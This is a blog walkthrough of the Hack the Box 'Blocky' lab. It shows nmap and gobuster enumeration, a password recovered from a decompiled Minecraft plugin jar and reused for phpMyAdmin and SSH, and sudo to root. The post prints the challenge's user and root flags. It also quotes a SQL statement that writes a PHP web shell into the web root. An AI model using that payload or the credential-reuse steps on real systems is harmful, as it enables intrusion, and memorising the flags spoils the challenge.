---
title: Blocky, Hack the Box CTF Walkthrough
description: 
tag: CTF
style: blog3
image: /assets/img/posts/2021-30-04-blocky-hack-the-box-walkthrough/blocky.png
layout: post
description: "Blocky is an easy level CTF challenge from the Hack the Box Archives. Developed by Arrexel and consists of a linux machine configured as a Minecraft and wordpress server"
date:   2021-03-29 20:01:21 -0400
last-updated: 2021-03-29 20:01:21 -0400
tag: ctf
author: Tyler Butler
lead: "Using the Java Decompiler to Analyze Source Code"
card: card-2
navheader: posts
---

Blocky is an easy level CTF challenge from the Hack the Box Archives. Developed by [Arrexel](https://app.hackthebox.eu/users/2904), the challenge consists of a linux machine configured as a Minecraft and wordpress server. It is easy to get carried away on this challenge, especially with poking at the wordpress and minecraft server, but once the user is compromised, escalation to root is trivial. My biggest takeaway from this CTF is to expand my basic directory brute force strategy to gaurentee a greater chance of discovery. 

## Major Takeaway's 
1) Don't reply on a simple `dirb` scan to brute force server directories   
2) Ensure to test username/password pairs on multiple services 


# Basic Enumeration 

To start, I used a simple <kbd>nmap</kbd> scan to look for running services and open ports. 

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sV -A -O -p- 10.10.10.37                                                                                                                                     1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-30 14:31 EDT
Nmap scan report for 10.10.10.37
Host is up (0.029s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Device type: general purpose|WAP|specialized|storage-misc|broadband router|printer
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (89%), HP embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT      ADDRESS
1   31.60 ms 10.10.14.1
2   31.65 ms 10.10.10.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.01 seconds
```

The resulting scan shows several running processes. I did some basic research on each service version to check for known vulnerabilities. At first, it seemed that the ProFTPD server might be vulnerable to the `mod_copy` exploit described in CVE-2015-3306. After trying a couple different PoC exploits, the target did not seem vulnerable so I moved on. Using `gobuster`, I searched for directories on the host. 

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.10.37 -w /home/kali/eWPT/kali-tools/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.37
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/eWPT/kali-tools/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/30 14:42:00 Starting gobuster in directory enumeration mode
===============================================================
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/]
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]   
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.10.37/javascript/] 
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.37/wp-admin/]   
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.10.37/phpmyadmin/] 
```

The resulting output indicated the /plugins directory, which when browsed, showed a custom plugin called BlockCore.jar. I downloaded the file and used the java decompiler tool `jd-gui` to inspect the classes. The class blockycore uses a hard-coded username and password, root:8YsqfCTnvxAUeduzjNSXe22.


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-30-04-blocky-hack-the-box-walkthrough/blockycore.png">
    </div>
</div>
<br/>  


# Compromise User

With a pair of found credentials, I attempted to access the wordpress site with no luck. Eventually I found that I could use the credentials to log into the phpmyadmin instance. As administrator of phpmyadmin, I was sure I could pivot to gain access to the machine. I attempted to create a new user account for the wordpress site, change the current "notch" user's password, and even upload a reverse shell using direct sql commands. None of these options worked, however a technique I came across described by Ryan Trost in the book "Practical Intrusion Analysis: Prevention and Detection for the Twenty-First Century: Prevention and Detection for the Twenty-First Century" was fairly interesting. It involves injecting  SQL command to insert a backdoor php file, 

```SQL
select “<? System($_REQUEST[‘cmd’]); ?>” into outfile “/var/www/html/cmd.php”;
``` 

In this instance, this method was blocked by insufficient file permissions, but I will be sure to consider this on future challenges. Ultimately, I was able to get root by attempting to log into the ssh service with the notch user and the admin credentials found in the jar file. 

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh notch@10.10.10.37
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ 
```
## User Flag

```bash
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5notch@Blocky:~$ 
```

## Compromise Root 

I instinctively tried to sudo to root, and was suprised when the notch user had permissions to do so. As root, I read the final flag. 

```bash
notch@Blocky:~$ sudo su root
[sudo] password for notch: 
Sorry, try again.
[sudo] password for notch: 
root@Blocky:/home/notch# cat ../../root/root.txt
0a9694a5b4d272c694679f7860f1cd5froot@Blocky:/home/notch# 
```